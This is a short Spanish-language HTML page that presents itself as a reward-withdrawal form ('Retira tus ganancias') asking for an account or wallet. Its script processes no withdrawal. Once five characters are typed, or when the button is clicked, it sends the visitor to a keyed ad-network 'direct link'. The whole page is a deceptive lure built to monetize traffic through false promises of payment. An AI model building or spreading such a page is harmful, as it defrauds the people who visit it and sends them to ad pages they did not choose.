<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Retiro de Recompensa</title>
  <style>
    body {
      background: #e0e5ec;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: #e0e5ec;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 10px 10px 30px #bebebe, -10px -10px 30px #ffffff;
      text-align: center;
      width: 90%;
      max-width: 400px;
    }
    h2 {
      color: #333;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 15px;
      border-radius: 10px;
      border: none;
      margin-bottom: 20px;
      box-shadow: inset 5px 5px 10px #bebebe, inset -5px -5px 10px #ffffff;
      font-size: 16px;
    }
    button {
      background-color: #00b894;
      color: white;
      padding: 15px 20px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
      box-shadow: 3px 3px 8px rgba(0,0,0,0.2);
      transition: background 0.3s;
    }
    button:hover {
      background-color: #019270;
    }
  </style>
</head>
<body>

  <div class="container">
    <h2>ðŸ’¸ Retira tus ganancias</h2>
    <p>Ingresa tu cuenta o billetera para continuar</p>
    <input type="text" id="wallet" placeholder="Tu cuenta de retiro" oninput="autoRedirect()">
    <button onclick="manualRedirect()">Retirar</button>
  </div>

  <script>
    const directLink = "https://www.profitableratecpm.com/bcbdpfp6w?key=214ba145b5e32e4428852c3e3b225a9c";

    function autoRedirect() {
      const wallet = document.getElementById("wallet").value.trim();
      if(wallet.length >= 5) {
        window.location.href = directLink;
      }
    }

    function manualRedirect() {
      const wallet = document.getElementById("wallet").value.trim();
      if(wallet === "") {
        alert("Por favor ingresa tu cuenta.");
      } else {
        window.location.href = directLink;
      }
    }
  </script>

</body>
</html>
